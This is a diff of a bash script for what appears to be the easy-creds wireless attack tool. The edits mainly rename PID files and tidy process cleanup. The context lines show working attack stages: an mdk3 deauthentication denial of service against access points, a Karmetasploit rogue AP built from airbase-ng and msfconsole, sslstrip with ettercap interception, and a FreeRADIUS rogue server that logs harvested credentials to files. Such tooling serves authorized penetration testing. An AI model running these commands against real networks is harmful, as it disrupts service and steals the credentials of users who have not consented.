@@ -117,8 +117,8 @@ f_Quit(){
 
 	# The following will run for the Karmetasploit attack
 	if [ ! -z ${karmasploit} ] ; then
-	 kill $(cat /tmp/ec/ec-karma-pid) &> /dev/null
-	 kill $(cat /tmp/ec/ec-metasploit-pid) &> /dev/null
+	 kill $(cat /tmp/ec/ec-karma.pid) &> /dev/null
+	 kill $(cat /tmp/ec/ec-metasploit.pid) &> /dev/null
 	fi
 
 	# The following will run for wireless Free Radius attacks
@@ -678,6 +678,8 @@ f_dhcptunnel(){
 	 xterm -geometry "${width}"x${height}-${x}+${y} -T "DMESG" -bg black -fg red -e tail -f /var/log/messages &
 	fi
 	sleep 2
+
+	#Get the PID so we can kill it when the user quits the attack
 	ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/tail.pid
 	
 	echo -e "\n\e[1;33m[*] DHCP server starting on tunneled interface.\e[0m"
@@ -713,7 +715,9 @@ f_finalstage(){
 		fi
 	fi
 	sleep 2
+	#Get the PID so we can kill it when the user quits the attack
 	ps ax|grep sslstrip|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/sslstrip.pid
+
 	#Launch ettercap
 	f_ecap
 	sleep 3
@@ -802,19 +806,16 @@ f_mdk3aps(){
 
 	 echo -e "\n\e[1;33m[*] Please stand by while we DoS the AP with BSSID Address $dosmac...\e[0m"
 	 sleep 3
-
-	if [ -z $isxrunning ]; then
-		screen -S easy-creds -X screen -t MDK3-DoS mdk3 ${dosmon} d -b /tmp/ec/ec-dosap
+		if [ -z $isxrunning ]; then
+			screen -S easy-creds -X screen -t MDK3-DoS mdk3 ${dosmon} d -b /tmp/ec/ec-dosap
+		else
+			xterm -geometry "${width}"x${height}+${x}-${y} -T "MDK3 AP DoS" -e mdk3 ${dosmon} d -b /tmp/ec/ec-dosap &
+		fi
+	 #Get the PID so we can kill it when the user quits the attack
+	 ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/dosap-pid
+	 echo -e "\n\e[1;33m[*] Ctrl-c or close the xterm window to stop the AP DoS attack...\e[0m"
 	else
-		xterm -geometry "${width}"x${height}+${x}-${y} -T "MDK3 AP DoS" -e mdk3 ${dosmon} d -b /tmp/ec/ec-dosap &
-	fi
-
-	 echo ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/dosap-pid
-	 sleep 5m && kill $(cat /tmp/ec/dosap-pid) &
-	 echo ps ax|grep sleep|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/sleep.pid
-	 echo -e "\n\e[1;33m[*] Attack will run for 5 minutes or you can close the xterm window to stop the AP DoS attack...\e[0m"
-	else
-	 f_getbssids
+	 	f_getbssids
 	fi
 	f_mainmenu
 }
@@ -845,11 +846,14 @@ f_lastman(){
 	
 	if [ -z ${isxrunning} ]; then
 		screen -S easy-creds -X screen -t Last-Man-Standing mdk3 ${dosmon} d -w /tmp/ec/ec-white.lst;(airmon-ng stop ${airomon} >/dev/null)
-		ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/dosap.pid
 	else
 		xterm -geometry 70x10+0-0 -T "Last Man Standing" -e mdk3 ${dosmon} d -w /tmp/ec/ec-white.lst;(airmon-ng stop ${airomon} >/dev/null) &
-		ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/dosap.pid
 	fi
+	sleep 2
+
+	#Get the PID so we can kill it when the user quits the attack
+	ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/dosap.pid
+
 	f_mainmenu
 }
 ##################################################
@@ -1035,7 +1039,7 @@ f_karmafinal(){
 	else
 	 xterm -geometry "${width}"x${height}-${x}+${y} -T "Airbase-NG" -e airbase-ng -P -C 30 -e "default" -v ${MONMODE} &
 	fi
-	echo $! > /tmp/ec/ec-karma-pid
+	echo $! > /tmp/ec/ec-karma.pid
 	sleep 7
 
 	echo -e "\n\e[1;33m[*] Configuring tunneled interface.\e[0m"
@@ -1065,6 +1069,8 @@ f_karmafinal(){
 	 xterm -geometry "${width}"x${height}-${x}+${y} -T "DMESG" -bg black -fg red -e tail -f /var/log/messages &
 	fi
 	sleep 3
+
+	#Get the PID so we can kill it when the user quits the attack
 	ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/tail.pid
 	
 	echo -e "\n\e[1;33m[*] DHCP server starting on tunneled interface.\e[0m\n"
@@ -1087,8 +1093,11 @@ f_karmafinal(){
 	 echo -e "\n\e[1;33m[*] Launching Karmetasploit, this may take a little bit...\e[0m\n"
 	 y=$((${y}+${yoffset}))
 	 xterm -geometry "${width}"x${height}-${x}+${y} -bg black -fg white -T "Karmetasploit" -e msfconsole -r /tmp/ec/karma.rc &
-	 echo $! > /tmp/ec/ec-metasploit-pid
 	fi
+	sleep 2
+
+	#Get the PID so we can kill it when the user quits the attack
+	ps ax|grep msfconsole|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/ec-metasploit.pid
 
 	#Enable IP forwarding
 	echo "1" > /proc/sys/net/ipv4/ip_forward
@@ -1237,14 +1246,16 @@ f_freeradiusfinal(){
 		y=$((${y}+${yoffset}))
 		xterm -geometry "${width}"x${height}-${x}+${y} -T "credentials" -bg black -fg green -hold -l -lf ${logfldr}/freeradius-creds-$(date +%F-%H%M).txt -e tail -f ${freeradiuslog} &
 		sleep 3
-		ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/tail.pid
 	else
 		screen -S FreeRadius -X screen -t credentials tail -f ${freeradiuslog}
 		screen -S FreeRadius -p credentials -X logfile ${logfldr}/freeradius-creds-$(date +%F-%H%M).txt
 		screen -S FreeRadius -p credentials -X log
 		sleep 3
-		ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/tail.pid
 	fi
+	sleep 2
+
+	#Get the PID so we can kill it when the user quits the attack
+	ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/tail.pid
 
 	tshark -i ${radwiface} -w ${logfldr}/freeradius-creds-$(date +%F-%H%M).dump &> /dev/null &
 	echo $! > /tmp/ec/tshark.pid
